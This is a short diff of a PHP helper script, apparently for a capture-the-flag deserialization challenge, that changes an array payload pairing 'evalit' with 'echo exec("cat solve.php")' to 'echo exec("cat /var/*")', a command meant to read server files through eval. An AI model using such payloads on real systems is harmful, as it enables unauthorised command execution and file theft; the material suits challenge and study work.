@@ -2,7 +2,7 @@
 
 // reference: https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize
 // $a=array( '0' => 'sum', '1'=> '3', '2'=>'2');
-$a=array( '0' => 'evalit', '1'=> 'echo exec("cat solve.php");');
+$a=array( '0' => 'evalit', '1'=> 'echo exec("cat /var/*");');
 print_r($a);
 echo "\n";
 
